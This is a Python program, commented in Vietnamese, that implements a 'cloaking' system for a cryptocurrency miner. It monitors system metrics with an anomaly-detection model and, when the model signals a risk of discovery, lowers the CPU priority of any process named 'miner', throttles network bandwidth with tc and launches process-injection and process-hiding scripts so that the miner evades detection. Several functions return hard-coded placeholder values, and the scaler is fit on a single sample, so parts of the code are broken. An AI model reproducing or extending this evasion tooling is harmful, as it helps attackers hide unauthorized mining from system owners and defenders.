import tensorflow as tf
from tensorflow.keras import models
import psutil
import GPUtil
from sklearn.preprocessing import MinMaxScaler
import logging
import time
import threading
import subprocess

# Thiết lập logging
logging.basicConfig(
    filename='cloaking_system.log',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s'
)

class AIEnvironmentCloaking:
    def __init__(self, model_path, cloaking_threshold=0.9):
        """
        Khởi tạo hệ thống cloaking với mô hình AI và ngưỡng cloaking.
        
        :param model_path: Đường dẫn tới tệp mô hình AI (.h5)
        :param cloaking_threshold: Ngưỡng lỗi tái tạo để kích hoạt cloaking
        """
        self.model = self.load_model(model_path)
        self.scaler = MinMaxScaler()
        self.cloaking_threshold = cloaking_threshold
        self.setup_system_metrics()
        self.is_cloaking_active = False
        self.lock = threading.Lock()

    def load_model(self, model_path):
        """
        Tải mô hình AI từ tệp .h5.
        
        :param model_path: Đường dẫn tới tệp mô hình AI
        :return: Mô hình đã tải
        """
        try:
            model = models.load_model(model_path)
            logging.info(f"Mô hình AI đã được tải thành công từ {model_path}")
            return model
        except Exception as e:
            logging.error(f"Lỗi khi tải mô hình AI: {e}")
            raise

    def setup_system_metrics(self):
        """
        Thiết lập các chỉ số hệ thống cần thu thập.
        """
        self.metrics = {
            "cpu_usage": 0,
            "ram_usage": 0,
            "gpu_memory_usage": 0,
            "disk_io": 0,
            "network_bandwidth": 0,
            "cache_usage": 0,
            "temperature": 0,
            "power_consumption": 0,
            "num_processes": 0,
            "threads_per_process": 0
        }

    def collect_system_metrics(self):
        """
        Thu thập các chỉ số hệ thống hiện tại.
        """
        try:
            self.metrics["cpu_usage"] = psutil.cpu_percent(interval=1)
            self.metrics["ram_usage"] = psutil.virtual_memory().percent
            gpu = GPUtil.getGPUs()[0] if GPUtil.getGPUs() else None
            if gpu:
                self.metrics["gpu_memory_usage"] = gpu.memoryUtil
            else:
                self.metrics["gpu_memory_usage"] = 0
            disk_io = psutil.disk_io_counters()
            self.metrics["disk_io"] = disk_io.read_bytes + disk_io.write_bytes
            net_io = psutil.net_io_counters()
            self.metrics["network_bandwidth"] = net_io.bytes_sent + net_io.bytes_recv
            # Cache usage không có sẵn trong psutil, cần sử dụng công cụ khác hoặc API hệ thống
            # Giả sử có hàm get_cache_usage() để lấy thông tin này
            self.metrics["cache_usage"] = self.get_cache_usage()
            self.metrics["temperature"] = self.get_system_temperature()
            self.metrics["power_consumption"] = self.get_power_consumption()
            self.metrics["num_processes"] = len(psutil.pids())
            self.metrics["threads_per_process"] = self.get_threads_per_process()
            logging.info(f"Thu thập chỉ số hệ thống thành công: {self.metrics}")
        except Exception as e:
            logging.error(f"Lỗi khi thu thập chỉ số hệ thống: {e}")

    def get_cache_usage(self):
        """
        Hàm giả định để lấy thông tin sử dụng cache.
        :return: Lượng cache đang sử dụng (MB)
        """
        # Cần triển khai tùy theo hệ thống
        return 512  # Giá trị giả định

    def get_system_temperature(self):
        """
        Hàm giả định để lấy thông tin nhiệt độ hệ thống.
        :return: Nhiệt độ hệ thống (°C)
        """
        # Cần triển khai tùy theo hệ thống, ví dụ sử dụng sensors trên Linux
        try:
            output = subprocess.check_output(['sensors']).decode()
            # Phân tích output để lấy nhiệt độ CPU, GPU, v.v.
            # Đây chỉ là ví dụ đơn giản
            cpu_temp = 50  # Giá trị giả định
            gpu_temp = 60  # Giá trị giả định
            return max(cpu_temp, gpu_temp)
        except Exception as e:
            logging.error(f"Lỗi khi lấy nhiệt độ hệ thống: {e}")
            return 0

    def get_power_consumption(self):
        """
        Hàm giả định để lấy thông tin tiêu thụ năng lượng.
        :return: Tiêu thụ năng lượng hệ thống (W)
        """
        # Cần triển khai tùy theo hệ thống
        return 250  # Giá trị giả định

    def get_threads_per_process(self):
        """
        Tính toán số luồng trung bình trên mỗi tiến trình.
        :return: Số luồng trung bình
        """
        try:
            total_threads = sum([proc.num_threads() for proc in psutil.process_iter(['num_threads'])])
            num_processes = len(psutil.pids())
            return total_threads / num_processes if num_processes > 0 else 0
        except Exception as e:
            logging.error(f"Lỗi khi tính số luồng: {e}")
            return 0

    def preprocess_data(self):
        """
        Tiền xử lý dữ liệu thu thập để phù hợp với đầu vào của mô hình AI.
        :return: Dữ liệu đã được chuẩn hóa
        """
        try:
            data = [
                self.metrics["cpu_usage"],
                self.metrics["ram_usage"],
                self.metrics["gpu_memory_usage"],
                self.metrics["disk_io"],
                self.metrics["network_bandwidth"],
                self.metrics["cache_usage"],
                self.metrics["temperature"],
                self.metrics["power_consumption"],
                self.metrics["num_processes"],
                self.metrics["threads_per_process"]
            ]
            scaled_data = self.scaler.fit_transform([data])[0]
            logging.info(f"Tiền xử lý dữ liệu thành công: {scaled_data}")
            return scaled_data
        except Exception as e:
            logging.error(f"Lỗi khi tiền xử lý dữ liệu: {e}")
            return None

    def detect_anomaly(self, scaled_data):
        """
        Sử dụng mô hình AI để phát hiện bất thường dựa trên dữ liệu đã được tiền xử lý.
        :param scaled_data: Dữ liệu đã được chuẩn hóa
        :return: Sai số tái tạo (Reconstruction Error)
        """
        try:
            reconstruction = self.model.predict(scaled_data.reshape(1, -1))
            reconstruction_error = tf.keras.losses.mean_squared_error(
                scaled_data, reconstruction[0]
            ).numpy()
            logging.info(f"Reconstruction Error: {reconstruction_error}")
            return reconstruction_error
        except Exception as e:
            logging.error(f"Lỗi khi phát hiện bất thường: {e}")
            return 0

    def perform_cloaking_actions(self, reconstruction_error):
        """
        Thực hiện các biện pháp cloaking dựa trên sai số tái tạo.
        :param reconstruction_error: Sai số tái tạo từ mô hình AI
        """
        if reconstruction_error > self.cloaking_threshold:
            with self.lock:
                if not self.is_cloaking_active:
                    self.is_cloaking_active = True
                    logging.info(f"Cloaking được kích hoạt với Reconstruction Error: {reconstruction_error}")
                    self.reduce_cpu_usage()
                    self.adjust_network_bandwidth()
                    self.apply_obfuscation_techniques()
        else:
            with self.lock:
                if self.is_cloaking_active:
                    self.is_cloaking_active = False
                    logging.info("Cloaking được hủy kích hoạt.")
                    self.restore_cpu_usage()
                    self.restore_network_bandwidth()
                    self.remove_obfuscation_techniques()

    def reduce_cpu_usage(self):
        """
        Giảm tải CPU để tránh gây ra sự bất thường.
        """
        try:
            # Ví dụ: Giảm độ ưu tiên của tiến trình khai thác
            # Cần xác định PID của tiến trình khai thác
            mining_process_pid = self.get_mining_process_pid()
            if mining_process_pid:
                p = psutil.Process(mining_process_pid)
                p.nice(psutil.IDLE_PRIORITY_CLASS if hasattr(psutil, 'IDLE_PRIORITY_CLASS') else 19)
                logging.info(f"Giảm độ ưu tiên CPU của tiến trình {mining_process_pid}")
        except Exception as e:
            logging.error(f"Lỗi khi giảm tải CPU: {e}")

    def restore_cpu_usage(self):
        """
        Khôi phục độ ưu tiên CPU của tiến trình khai thác.
        """
        try:
            mining_process_pid = self.get_mining_process_pid()
            if mining_process_pid:
                p = psutil.Process(mining_process_pid)
                p.nice(psutil.NORMAL_PRIORITY_CLASS if hasattr(psutil, 'NORMAL_PRIORITY_CLASS') else 0)
                logging.info(f"Khôi phục độ ưu tiên CPU của tiến trình {mining_process_pid}")
        except Exception as e:
            logging.error(f"Lỗi khi khôi phục tải CPU: {e}")

    def adjust_network_bandwidth(self):
        """
        Điều chỉnh băng thông mạng để tránh bị phát hiện.
        """
        try:
            # Ví dụ: Giới hạn băng thông sử dụng
            # Cần sử dụng các công cụ như 'tc' trên Linux để giới hạn băng thông
            subprocess.call(['tc', 'qdisc', 'add', 'dev', 'eth0', 'root', 'tbf', 'rate', '50mbit', 'burst', '32kbit', 'latency', '400ms'])
            logging.info("Điều chỉnh băng thông mạng thành công.")
        except Exception as e:
            logging.error(f"Lỗi khi điều chỉnh băng thông mạng: {e}")

    def restore_network_bandwidth(self):
        """
        Khôi phục băng thông mạng ban đầu.
        """
        try:
            subprocess.call(['tc', 'qdisc', 'del', 'dev', 'eth0', 'root'])
            logging.info("Khôi phục băng thông mạng thành công.")
        except Exception as e:
            logging.error(f"Lỗi khi khôi phục băng thông mạng: {e}")

    def apply_obfuscation_techniques(self):
        """
        Áp dụng các kỹ thuật ngụy trang như process injection, dynamic process hiding, etc.
        """
        try:
            # Giả định có các script hoặc công cụ để thực hiện các kỹ thuật ngụy trang
            subprocess.Popen(['./process_injection.sh'])
            subprocess.Popen(['./dynamic_process_hiding.sh'])
            logging.info("Áp dụng các kỹ thuật ngụy trang thành công.")
        except Exception as e:
            logging.error(f"Lỗi khi áp dụng kỹ thuật ngụy trang: {e}")

    def remove_obfuscation_techniques(self):
        """
        Loại bỏ các kỹ thuật ngụy trang đã áp dụng.
        """
        try:
            # Giả định có các script hoặc công cụ để loại bỏ các kỹ thuật ngụy trang
            subprocess.call(['./remove_process_injection.sh'])
            subprocess.call(['./remove_dynamic_process_hiding.sh'])
            logging.info("Loại bỏ các kỹ thuật ngụy trang thành công.")
        except Exception as e:
            logging.error(f"Lỗi khi loại bỏ kỹ thuật ngụy trang: {e}")

    def get_mining_process_pid(self):
        """
        Tìm PID của tiến trình khai thác.
        :return: PID của tiến trình khai thác hoặc None nếu không tìm thấy
        """
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower():
                    return proc.info['pid']
            return None
        except Exception as e:
            logging.error(f"Lỗi khi tìm PID của tiến trình khai thác: {e}")
            return None

    def run_cloaking_cycle(self):
        """
        Thực hiện một chu kỳ cloaking: thu thập dữ liệu, phát hiện bất thường và thực hiện cloaking nếu cần.
        """
        self.collect_system_metrics()
        scaled_data = self.preprocess_data()
        if scaled_data is not None:
            reconstruction_error = self.detect_anomaly(scaled_data)
            self.perform_cloaking_actions(reconstruction_error)

    def start(self, interval=60):
        """
        Bắt đầu hệ thống cloaking, thực hiện chu kỳ cloaking định kỳ.
        
        :param interval: Khoảng thời gian giữa các chu kỳ cloaking (giây)
        """
        def cloaking_loop():
            while True:
                self.run_cloaking_cycle()
                time.sleep(interval)
        
        cloaking_thread = threading.Thread(target=cloaking_loop, daemon=True)
        cloaking_thread.start()
        logging.info("Hệ thống cloaking đã bắt đầu.")

if __name__ == "__main__":
    # Đường dẫn tới mô hình AI
    MODEL_PATH = 'cloaking_model.h5'
    
    # Tạo đối tượng cloaking
    cloaking_system = AIEnvironmentCloaking(model_path=MODEL_PATH, cloaking_threshold=0.9)
    
    # Bắt đầu hệ thống cloaking với chu kỳ 60 giây
    cloaking_system.start(interval=120)
    
    # Giữ chương trình chạy
    while True:
        time.sleep(1)
